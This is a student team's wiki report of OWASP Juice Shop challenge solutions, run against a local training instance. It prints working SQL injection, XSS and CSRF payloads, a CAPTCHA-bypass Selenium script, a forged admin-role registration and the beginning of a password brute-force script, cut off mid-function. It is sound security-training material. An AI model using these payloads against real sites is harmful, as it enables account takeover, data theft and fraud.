# Juice Shop Project Report

Web Security

## Team Information

| ID       | Name             | Email                         |
| -------- | ---------------- | ----------------------------- |
| 19127631 | Duong Tien Vinh  | 19127631@student.hcmus.edu.vn |
| 19127626 | Le Nguyen Tu Van | 19127626@student.hcmus.edu.vn |
| 19127154 | Nguyen The Hung  | 19127154@student.hcmus.edu.vn |

## Assignment

<div>
    <table>
        <thead>
            <tr>
                <th>
                    Name
                </th>
                <th>
                    Assign
                </th>
                <th>
                    Difficulty
                </th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td><a href="#dom-xss">DOM XSS</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#exposed-metrics">Exposed Metrics</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#score-board">Score board</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#zero-stars">Zero Stars</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#admin-section">Admin Section</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#login-admin">Login Admin</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#deprecated-interface">Deprecated Interface</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#password-strength">Password Strength</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#reflected-xss-unavailable-on-docker">Reflected XSS (Unavailable on Docker)</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#weird-crypto">Weird Crypto</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#security-policy">Security Policy</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#visual-geo-stalking">Visual Geo Stalking</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#captcha-bypass">CAPTCHA Bypass</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#csrf">CSRF</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#database-schema">Database Schema</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#deluxe-fraud">Deluxe Fraud</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#forged-feedback">Forged Feedback</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#manipulate-basket">Manipulate Basket</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#payback-time">Payback Time</a></td>
                <td><span>Vinh</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#admin-registration">Admin Registration</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#gdpr-data-erasure">GDPR Data Erasure</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#privacy-policy-inspection">Privacy Policy Inspection</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#login-bender">Login Bender</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#login-jim">Login Jim</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#bjoern-s-favorite-pet">Bjoern's Favorite Pet</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#forged-review">Forged Review</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#login-amy">Login Amy</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#upload-type">Upload Type</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#product-tampering">Product Tampering</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#reset-jim-s-password">Reset Jim's Password</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#upload-size">Upload Size</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#five-star-feedback">Five-Star Feedback</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#login-mc-safe-search">Login MC SafeSearch</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#meta-geo-stalking">Meta Geo Stalking</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#view-basket">View Basket</a></td>
                <td><span>Van</span></td>
                <td><span>🌟🌟</span></td>
            </tr>
            <tr>
                <td><a href="#bonus-payload">Bonus Payload</a></td>
                <td><span>Van</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#confidential-document">Confidential Document</a></td>
                <td><span>Van</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#missing-encoding">Missing Encoding</a></td>
                <td><span>Van</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#privacy-policy">Privacy Policy</a></td>
                <td><span>Van</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#bully-chatbot">Bully Chatbot</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#error-handling">Error Handling</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#outdated-allowlist">Outdated Allowlist</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟</span></td>
            </tr>
            <tr>
                <td><a href="#repetitive-registration">Repetitive Registration</a></td>
                <td><span>Hung</span></td>
                <td><span>🌟</span></td>
            </tr>
        </tbody>
    </table>
</div>

## Challenge Solution:

<!-- GENERATE-DOC:START -->

### Admin Registration

**Difficulty**: 🌟🌟🌟

**Description**: Register as a user with administrator privileges.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

First, I create a normal account

![image](https://user-images.githubusercontent.com/63692190/180629616-0296bc36-1783-4930-bd27-3af0a823693a.png)

Inspecting a valid registration request show me that privileges system may be managed via a `role` value

![image](https://user-images.githubusercontent.com/63692190/180629755-bfcc33db-d9c8-4635-9c27-d6a5bb346ce4.png)

So I decided to forge a registration request with `role` admin

![image](https://user-images.githubusercontent.com/63692190/180629885-8e709e02-9957-4659-ba6a-09023769f9aa.png)

And the challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180629903-62b0a17c-5425-4438-a292-fd8de9c1cc22.png)

---

### Admin Section

**Difficulty**: 🌟🌟

**Description**: Access the administration section of the store.

**Category**:

**Tags**: `Good for Demos`

**Solution**:

Just like the way I found the `Scoreboard` path, I opened DevTool and look out for the file `main.js`, then searched for the `admin` or `administration` path:

![finding admin URL path](https://user-images.githubusercontent.com/64480713/179966081-f51838eb-3779-4b20-b206-b9d934472b90.png)

And access the URL `/administration`:

![admin URL path](https://user-images.githubusercontent.com/64480713/179966343-44bbdcbe-e1fc-460c-b16e-a60afe1a900e.png)

> NOTE: You have to log in with an admin account first.

---

### Bjoern's Favorite Pet

**Difficulty**: 🌟🌟🌟

**Description**: Reset the password of Bjoern's OWASP account via the [Forgot Password](http://127.0.0.1:3000/#/forgot-password) mechanism with the original answer to his security question.

**Category**: Broken Authentication

**Tags**: `OSINT`

**Solution**:

Search google with Bjoern's Favorite Pet you will see [this video](https://www.youtube.com/watch?v=Lu0-kDdtVf4&ab_channel=OWASPFoundation)

At 3:43 you will see his email and the name of his favorite pet
![image](https://user-images.githubusercontent.com/70436051/180364820-e4223001-fa33-4d4e-9b03-c1bf05eaf841.png)

Using it to reset password
![image](https://user-images.githubusercontent.com/70436051/180365134-4627485a-cb5c-498d-87eb-009c8cead6c1.png)

We got this challenge

---

### Bonus Payload

**Difficulty**: 🌟

**Description**: Use the bonus payload

```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

in the DOM XSS challenge.

**Category**: XSS

**Tags**: `Shenanigans`, `Tutorial`

**Solution**:

Paste the payload in search bar:

![result](https://user-images.githubusercontent.com/64480713/179962281-aa363737-1c54-46b6-8bd4-8a54b7a495e4.png)

---

### Bully Chatbot

**Difficulty**: 🌟

**Description**: Receive a coupon code from the support chatbot.

**Category**: Miscellaneous

**Tags**: `Shenanigans`, `Brute Force`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

After login, I head to `Support Chat` in `Contact` section to chat with support chatbot and try to ask for coupon but no result

![image](https://user-images.githubusercontent.com/63692190/180629349-0c833369-f122-4cfd-906d-d803cb57a297.png)

So I Burp Suite Repeater to brute force the process

![image](https://user-images.githubusercontent.com/63692190/180629382-8109744d-4bc9-4939-85e6-df5f79a66e4c.png)

And the challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180629405-ae615a02-6ad0-4339-834e-e6e83e08e3ea.png)

---

### CAPTCHA Bypass

**Difficulty**: 🌟🌟🌟

**Description**: Submit 10 or more customer feedbacks within 10 seconds.

**Category**: Broken Anti Automation

**Tags**: `Brute Force`

**Solution**:

Using Selenium:

Tested on:

- Python: 3.10.4
- [ChromeDriver 103.0.5060.134](https://chromedriver.storage.googleapis.com/index.html?path=103.0.5060.134/)
- selenium = "4.3.0"

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

driver = webdriver.Chrome("./chromedriver")
driver.get("http://localhost:3000/#/contact")

wait = WebDriverWait(driver, 10)

btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Dismiss']")))
btn.click()

for i in range(10):
    comment = driver.find_element(By.ID, "comment")
    comment.send_keys("some text")

    rating = driver.find_element(By.ID, "rating")
    rating.click()

    captcha = driver.find_element(By.ID, "captcha")
    captchaResult = eval(captcha.text)

    captchaControl = driver.find_element(By.ID, "captchaControl")
    captchaControl.send_keys(captchaResult)

    submitButton = driver.find_element(By.ID, "submitButton")
    submitButton.click()
driver.close()
```

Result:

![filling form using selenium](https://user-images.githubusercontent.com/64480713/180011503-0f6698b4-e608-43a8-8690-7f218a2f0da5.png)

---

### CSRF

**Difficulty**: 🌟🌟🌟

**Description**: Change the name of a user by performing Cross-Site Request Forgery from [another origin](http://htmledit.squarefree.com/).

**Category**: Broken Access Control

**Tags**:

**Solution**:

Tested on:

- Windows 11
- Firefox: [60.0.2/win64/en-US](https://ftp.mozilla.org/pub/firefox/releases/60.0.2/win64/en-US/Firefox%20Setup%2060.0.2.exe)

> NOTE: New Firefox version can't perform this attack❗.

> NOTE: Firefox version 60.0.2 won't display modal or navigate bar normally, so I suggest you navigate between pages using URL.

First, log in to the user account and navigate to route `localhost:3000/profile`:

![login](https://user-images.githubusercontent.com/64480713/180457006-2225a54c-5249-4799-b472-efd95509daa3.png)

Then open http://htmledit.squarefree.com/ as a new tab:

> NOTE: Open with `http` as intended.

![live HTML editor](https://user-images.githubusercontent.com/64480713/180457493-cb81f9e7-4446-4528-8ca9-0fef6590695d.png)

Then paste the code below to the HTML live editor:

```html
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="DuckyMomo20012" />
  <input type="submit" />
</form>
<script>
  document.forms[0].submit();
</script>
```

The attack will be performed **immediately**:

![CSRF attack](https://user-images.githubusercontent.com/64480713/180457737-f06682c3-0113-48e5-b8db-6965b2894275.png)

Then reload the profile page to see changes:

![result](https://user-images.githubusercontent.com/64480713/180457852-255de565-3977-4bb6-bd9b-7579fab1db0c.png)

---

### Confidential Document

**Difficulty**: 🌟

**Description**: Access a confidential document.

**Category**: Sensitive Data Exposure

**Tags**: `Good for Demos`

**Solution**:
On the About Us page, when we hover over the text `Check out our boring terms of use if you are interested in such lame stuff`, we see an `http://127.0.0.1:3000/ftp/legal.md` link in the lower left corner of the web page.
![image](https://user-images.githubusercontent.com/70436051/180162802-f5f6140f-342c-4897-98ed-2451742e8980.png)
We access the path `http://127.0.0.1:3000/ftp` and will see a list of files
![image](https://user-images.githubusercontent.com/70436051/180163234-966454b0-b728-4ea3-9ddd-3ebf23d75b7f.png)
We click on `acquisitions.md` and we get the challenge
![image](https://user-images.githubusercontent.com/70436051/180163675-ecaf65df-9a31-4f25-b1b1-f5a0baac7ea9.png)
![image](https://user-images.githubusercontent.com/70436051/180165183-23d0aee2-f68b-42a3-a67d-62c459a07a27.png)

---

### DOM XSS

**Difficulty**: 🌟

**Description**: Perform a DOM XSS attack with `<iframe src="javascript:alert(`xss`)">`.

**Category**: XSS

**Tags**: `Good for Demos`, `Tutorial`

**Solution**:

Paste the code below to try to exploit XSS attack:

```html
<iframe src="javascript:alert(`xss`)"></iframe>
```

![dom xss attack](https://user-images.githubusercontent.com/64480713/179652403-d4efd89a-4c44-4709-8cb9-d05a83c600bd.png)

---

### Database Schema

**Difficulty**: 🌟🌟🌟

**Description**: Exfiltrate the entire DB schema definition via SQL Injection.

**Category**: Injection

**Tags**:

**Solution**:

After taking a peek at the solution, I can finally extract all the database schema from SQLite:

Query string: `/rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--`

> :warning: NOTE: The query string from juice-shop [solution](https://github.com/refabr1k/owasp-juiceshop-solutions/blob/master/Level3/database-schema.md): `/rest/products/search?q=asd'))+union+select+sql,2,3,4,5,6,7,8,9+from+sqlite_master+where+type='table'--` **killed** my Docker container instantly.

<details>
<summary>Example request</summary>

```
GET /rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
Content-Length: 2285

 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhbXlAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAzMGYwNWU0NWUzMDcxMGMzYWQzYzMyZjAwZGUwNDczIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ5MDExMywiZXhwIjoxNjU4NTA4MTEzfQ.b1R88nwcNHfDZPFQSQDyyVSxzwuW2S7TC7qGoIi81oKaTNl7fJH77ngvBE1I9oCrcZKB7zVlhtNhXM4iVZOkI_Zc6WWc2v04UKpSJGoqBv7Ki68GcoIJCAXAiOPG6ZFw8KWVkfR4cow5HMX4uc9bVwayJirtaaAAAU7xg3x5BQ8
Connection: keep-alive
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=b9tDIes4UzHDT6FzfpSei4frkuOmtXqiBWSl5HLRCBLSk3UlRTKwiOahX8tOOIR1Tyrs1aIvY; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhbXlAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAzMGYwNWU0NWUzMDcxMGMzYWQzYzMyZjAwZGUwNDczIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMTE6MjY6MzYuNTI0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ5MDExMywiZXhwIjoxNjU4NTA4MTEzfQ.b1R88nwcNHfDZPFQSQDyyVSxzwuW2S7TC7qGoIi81oKaTNl7fJH77ngvBE1I9oCrcZKB7zVlhtNhXM4iVZOkI_Zc6WWc2v04UKpSJGoqBv7Ki68GcoIJCAXAiOPG6ZFw8KWVkfR4cow5HMX4uc9bVwayJirtaaAAAU7xg3x5BQ8
DNT: 1
Host: localhost:3000
If-None-Match: W/"3250-y03qquSPAF5wuSLz49f3Ic5bcqg"
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
```

</details>

![success request](https://user-images.githubusercontent.com/64480713/180471149-1ee6d5b6-31a6-45f9-89ba-dda403572c59.png)

---

### Deluxe Fraud

**Difficulty**: 🌟

**Description**: Obtain a Deluxe Membership without paying for it.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

First I tried to force submit the deluxe membership form with empty parameters:

<details>
<summary>Example request</summary>

```
POST /rest/deluxe-membership HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ1NjE1NiwiZXhwIjoxNjU4NDc0MTU2fQ.lr4WFo4ALp7VB9ki6IUdwblj2WqGMDh5u-MJIEiE8GQ9re580qX0uK3W4Yvlzbto3mGuG9dWsysF4MgsLuBrMJMtffWyKPZyu4rI-BwG__rknicsX2ZvxTYTxMRvJG5UKvSnzvOcIbn0zKRymslfyoLevspYl4SQvVjoG84oD_8
Connection: keep-alive
Content-Length: 31
Content-Type: application/json
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=4lVv9QOZJeAVbtqsVU9HkTzfxijKtPESeJSPBU48FPPIm8s38AMoEqgzBbLr; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ1NjE1NiwiZXhwIjoxNjU4NDc0MTU2fQ.lr4WFo4ALp7VB9ki6IUdwblj2WqGMDh5u-MJIEiE8GQ9re580qX0uK3W4Yvlzbto3mGuG9dWsysF4MgsLuBrMJMtffWyKPZyu4rI-BwG__rknicsX2ZvxTYTxMRvJG5UKvSnzvOcIbn0zKRymslfyoLevspYl4SQvVjoG84oD_8
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"

{
    "paymentMode": "card"
}
```

</details>

But I got a bad request error:

![bad request](https://user-images.githubusercontent.com/64480713/180348736-c7908150-e91c-4edf-9618-bacb5c001069.png)

So I tried to submit with `paymentMode` is `none`, and it just works:

![result](https://user-images.githubusercontent.com/64480713/180349077-262bec29-8178-4137-811f-fbfc0617ae96.png)

---

### Deprecated Interface

**Difficulty**: 🌟🌟

**Description**: Use a deprecated B2B interface that was not properly shut down.

**Category**: Security Misconfiguration

**Tags**: `Contraption`, `Prerequisite`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->

When searching for term `deprecated`, `B2B`, `shut down` in file `main.js`, I found this

![image](https://user-images.githubusercontent.com/63692190/180627686-97e22b5e-c6e7-4e85-83dc-e0131dd0ee59.png)

B2B customer is allowed to upload XML order file, so head to http://localhost:3000/#/complain and try to upload a random XML file
The Choose File is to default accepting (filtering) "Custom Files" which seems to be PDF, ZIP file

![image](https://user-images.githubusercontent.com/63692190/180627813-1a7dfe7e-360d-41a5-b5a5-f8c8691aed45.png)

I changed filter to All Files and force upload an XML file

![image](https://user-images.githubusercontent.com/63692190/180627837-717aad8f-3c63-4542-8ac7-f5ae5c944689.png)

Result:

![image](https://user-images.githubusercontent.com/63692190/180627850-220beaa2-b3cd-407e-a8c0-bf47fb34ac39.png)

---

### Error Handling

**Difficulty**: 🌟

**Description**: Provoke an error that is neither very gracefully nor consistently handled.

**Category**: Security Misconfiguration

**Tags**: `Prerequisite`

**Solution**:

I try to attack using SQL Injection with this information:

- username: `'`
- password: anything. E.g: `foobarbaz`.

![result](https://user-images.githubusercontent.com/64480713/179669526-e0b49cfb-42e1-4103-b625-8e5e6a487550.png)

---

### Exposed Metrics

**Difficulty**: 🌟

**Description**: Find the endpoint that serves usage data to be scraped by a [popular monitoring system](https://github.com/prometheus/prometheus).

**Category**: Sensitive Data Exposure

**Tags**: `Good Practice`

**Solution**:

Access this route: `http://localhost:3000/metrics`. Because Prometheus use `/metrics` route to inspect metrics, so I try to access this route to view sensitive metrics.

![result](https://user-images.githubusercontent.com/64480713/179664330-9daa56f0-c3e3-4289-a730-6401f2b5ed3f.png)

---

### Five-Star Feedback

**Difficulty**: 🌟🌟

**Description**: Get rid of all 5-star customer feedback.

**Category**:
Broken Access Control

**Tags**:

**Solution**:

Continue after `Admin Session`, access the URL `/administration`
![image](https://user-images.githubusercontent.com/70436051/180360046-8fd901f7-026b-40cb-8dac-daf43f10abb8.png)

Now we delete the five-star review and got this challenge
![image](https://user-images.githubusercontent.com/70436051/180360183-cc22a701-76d8-4a29-81c4-070276141a11.png)

---

### Forged Feedback

**Difficulty**: 🌟🌟🌟

**Description**: Post some feedback in another user's name.

**Category**: Broken Access Control

**Tags**: `Tutorial`

**Solution**:

Logged in another user account, e.g: admin account, and open the page Feedback **with a new tab**. Then navigate back to the dashboard and log out. After logging out, navigate back to the Feedback page, you will see the feedback submission still have the author is your logged out admin email :interrobang::

![feedback with logged-out account](https://user-images.githubusercontent.com/64480713/179971604-89ab7e56-2c84-42c7-9d98-fd11a78a28ff.png)

---

### Forged Review

**Difficulty**: 🌟🌟🌟

**Description**: Post a product review as another user or edit any user's existing review.

**Category**: Broken Access Control

**Tags**:

**Solution**:

Let's write a review but not submit
![image](https://user-images.githubusercontent.com/70436051/180378660-764261fb-8509-44cf-b982-824680085543.png)

Open Burp Suite and turn on Intercept
![image](https://user-images.githubusercontent.com/70436051/180378825-fbbbbcee-3aef-4355-b43f-74d2b2a1b447.png)

Submit the review and watch the change in Burp Suite
![image](https://user-images.githubusercontent.com/70436051/180380214-ee6ca9ef-6ee7-4bee-a4f8-68a8a3c72f1e.png)

Now we change the name of the author and click forward
![image](https://user-images.githubusercontent.com/70436051/180380311-a5b87034-8704-4931-b79e-81c7270e7277.png)

We got this challenge
![image](https://user-images.githubusercontent.com/70436051/180380435-854b7c0a-280f-4454-8d34-2b6a7b873b46.png)

---

### GDPR Data Erasure

**Difficulty**: 🌟🌟🌟

**Description**: Log in with Chris' erased user account.

**Category**: Broken Authentication

**Tags**:

**Solution**:

Using SQL injection, log in with email `\' or deletedAt IS NOT NULL--` and any password. Chris might be the first ever deleted user.

![image](https://user-images.githubusercontent.com/63692190/180641574-418d6728-cc06-44f0-b971-d77ff26757bf.png)

The challenge is solved

![image](https://user-images.githubusercontent.com/63692190/180641593-8eb5a26f-6e43-45c2-9bfb-6e3edff099eb.png)

---

### Welcome to the owasp-juice-shop wiki!

To contribute to the project, please **add a wiki page** with the form format below to submit the challenge solution and **a backup file** to store progress. E.g: `owasp_juice shop-2022-07-19.json`.

> NOTE: Now the backup file will be generated automatically :ok_hand:.

---

Submission form:

```
### Challenge name

**Difficulty**: 🌟

**Description**:

**Category**:

**Tags**: `Shenanigans`, `Contraption`, `OSINT`, `Good Practice`, `Danger Zone`,
`Good for Demos`, `Prerequisite`, `Brute Force`, `Tutorial`, `Code Analysis`

**Solution**:

<!-- Please include screenshots for each step. Remember that the screenshot includes a clock to indicate the time solved. -->
```

---

### Login Admin

**Difficulty**: 🌟🌟

**Description**: Log in with the administrator's user account.

**Category**: Injection

**Tags**: `Good for Demos`, `Tutorial`

**Solution**:

With the email format from Emma's account (Visual Geo Stalking), I think the admin account should have the same email format: `admin@juice-sh.op`. So I tried SQL Injection with user email: `admin@juice-sh.op'--` and password is anything characters:

![SQL injection](https://user-images.githubusercontent.com/64480713/179964994-c524ca74-5ebe-49ab-9b5d-264743dc6e23.png)

And finally, I can log in using admin account:

![successfully logged in](https://user-images.githubusercontent.com/64480713/179965513-163a76fe-2944-4db7-bd70-1af54c841112.png)

---

### Login Amy

**Difficulty**: 🌟🌟🌟

**Description**: Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")

**Category**: Sensitive Data Exposure

**Tags**: `OSINT`

**Solution**:

So I tried to search for the term "93.83 billion trillion trillion centuries" and found this blog:

![search for term](https://user-images.githubusercontent.com/64480713/180432555-5f5f9426-2f35-41b9-88b6-60016589e658.png)

When I scroll down the blog, I found a note about "One Important Final Note":

![one important final note](https://user-images.githubusercontent.com/64480713/180432728-3187f23d-ad44-4d4a-8573-243d3ca183ce.png)

And I found a snippet of code to brute force Amy's password:

Tested on:

Python: 3.10.4
aiohttp = "3.8.1"

<details>
<summary>Snippet code</summary>

```python
import asyncio

import aiohttp

your_juice_shop_url = "http://localhost:3000{}".format("/rest/user/login")


def build_queue():

    queue = []

    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase_letters = "abcdefghijklmniopqrstuvxyz"
    numbers = "0123456789"

    for up_letter in uppercase_letters:
